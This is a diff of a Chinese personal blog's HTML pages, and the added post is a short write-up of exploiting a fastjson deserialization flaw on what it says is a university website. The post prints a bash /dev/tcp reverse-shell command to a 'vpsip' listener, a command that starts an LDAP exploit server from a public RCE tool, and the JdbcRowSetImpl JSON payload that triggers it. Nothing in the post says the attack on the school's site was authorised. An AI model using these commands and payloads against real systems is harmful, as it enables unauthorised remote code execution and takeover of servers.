@@ -10,7 +10,7 @@
     
     
     
-    <title>tags: getshell | spaceman&#39;blog</title>
+    <title>一次fastjson反序列化-实战 | spaceman&#39;blog</title>
     <link href="https://spaceman-911.gitee.io" rel="prefetch" />
 
     
@@ -160,19 +160,34 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-tag">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="https://spaceman-911.gitee.io">spaceman&#39;blog</a>
         >
-        <span>标签</span>
+        <span>一次fastjson反序列化-实战</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/tags/getshell/index.html">getshell</a>
+                <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/">一次fastjson反序列化-实战</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/getshell/">getshell</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2021-02-23
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -180,24 +195,52 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/tags/getshell/index.html">getshell</a>
+                    <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/">一次fastjson反序列化-实战</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2021-02-23
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/getshell/">getshell</a>
+                
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-            <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/">一次fastjson反序列化-实战</a>
-            <br>
-            
-            <a href="/2021/02/23/%E4%BB%8E%E4%B8%80%E6%AC%A1%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0getshell/">从一次文件下载到getshell</a>
-            <br>
-            
-            
-        </div>
+    <div class="content-article">
+        <h1 id="一次fastjson反序列化-实战"><a class="markdownIt-Anchor" href="#一次fastjson反序列化-实战">#</a> 一次 fastjson 反序列化 - 实战</h1>
+<p>爪哇一窍不通的我，某次找到一个高校的站点</p>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223232315119.png" alt="image-20210223232315119"></p>
+<p>随便登录抓包，发现是 json 请求</p>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223232438624.png" alt="image-20210223232438624"></p>
+<p>于是尝试使用 Bp 插件 Fastjsonscan 扫描</p>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223232701856.png" alt="image-20210223232701856"></p>
+<p>这不是 fastjson 反序列化漏洞吗，工具梭哈，首先生成编码后的反弹 shell 生成编码后的反弹 shell（编码地址：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vpsip&#x2F;3344 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223232859305.png" alt="image-20210223232859305"></p>
+<p>使用 rce 工具（ <a target="_blank" rel="noopener" href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a> ），在 vps 上运行 rce 工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections5 &quot;编码后的bash&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223232928344.png" alt="image-20210223232928344"></p>
+<p>再开启一个终端 vps 监听 3344 端口，bp 改包发送数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;vps:1099&#x2F;Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223233026927.png" alt="image-20210223233026927"></p>
+<p>成功反弹 shell</p>
+<p><img src="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/image-20210223233044314.png" alt="image-20210223233044314"></p>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h2>
+<ol>
+<li>原理或许不知道，但是可以尝试工具梭哈，脚本小子就是我</li>
+<li>多看大佬的文章，最新的漏洞，在实战时有很大的帮助</li>
+</ol>
+
     </div>
 </article>
+
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -339,17 +382,17 @@
 
                 
                 <li>
-                    <a href="/tags/getshell/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/tags/getshell/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/tags/getshell/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -357,11 +400,11 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/CVE/" style="font-size: 10.514235876701843px;" class="tag-cloud-link">CVE</a>
+    <a href="/tags/CVE/" style="font-size: 15.8421009592943px;" class="tag-cloud-link">CVE</a>
     
-    <a href="/tags/MSF/" style="font-size: 11.655402937792708px;" class="tag-cloud-link">MSF</a>
+    <a href="/tags/MSF/" style="font-size: 10.319111728925524px;" class="tag-cloud-link">MSF</a>
     
-    <a href="/tags/getshell/" style="font-size: 18.75861017700312px;" class="tag-cloud-link">getshell</a>
+    <a href="/tags/getshell/" style="font-size: 14.666774407292777px;" class="tag-cloud-link">getshell</a>
     
 </div>
                 
